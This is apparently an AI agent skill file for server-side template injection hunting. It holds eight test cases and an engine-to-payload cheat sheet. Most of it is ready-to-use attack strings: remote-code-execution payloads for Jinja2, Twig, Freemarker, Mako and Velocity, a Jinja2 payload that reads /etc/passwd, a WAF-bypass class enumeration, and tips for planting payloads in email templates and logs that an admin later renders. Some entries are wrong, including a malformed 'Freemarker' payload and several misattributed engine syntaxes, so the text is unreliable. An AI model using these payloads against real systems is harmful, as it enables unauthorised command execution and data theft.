# SSTI Hunting Skill — 8 Test Cases

> Load when: SSTI, server-side template injection, template escape, expression language injection.

## 126. Basic SSTI detection (easy)
Send `{{7*7}}` in every parameter. If response contains `49`, SSTI is confirmed. Also test `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.

## 127. SSTI to RCE in Jinja2 (medium)
Once SSTI confirmed in Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

## 128. SSTI to RCE in Twig (medium)
In Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

## 129. SSTI to RCE in Freemarker (medium)
In Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

## 130. SSTI to file read (easy)
Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`
Freemarker: `{"__import__("os").popen("id").read()}`

## 131. SSTI with WAF bypass (hard)
If common patterns are blocked: `{{''.__class__.__mro__[2].__subclasses__()}}` to enumerate classes, then pick one with `os.popen`.

## 132. SSTI via email template (hard)
If app renders email templates with user input, inject SSTI payload into subject/body and wait for admin to trigger email send.

## 133. SSTI in log messages (hard)
If user input is logged and later rendered in admin templates via SSTI, inject payload into user-agent, request path, or error messages.

---

## Template Engine Detection
| Test Payload | Engine |
|-------------|--------|
| `{{7*7}}` | Jinja2, Twig, Mako, Nunjucks |
| `${7*7}` | FreeMarker, Velocity |
| `<%= 7*7 %>` | ERB, EJS |
| `#{7*7}` | Ruby ERB |
| `*{7*7}` | Pug/Jade |
| `@{7*7}` | Play Framework |

## SSTI → RCE Cheat Sheet
| Engine | RCE Payload |
|--------|-------------|
| Jinja2 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Freemarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Mako | `<% import os; x=os.popen('id').read() %>${x}` |
| Velocity | `$class.inspect("java.lang.Runtime").getRuntime().exec('id')` |
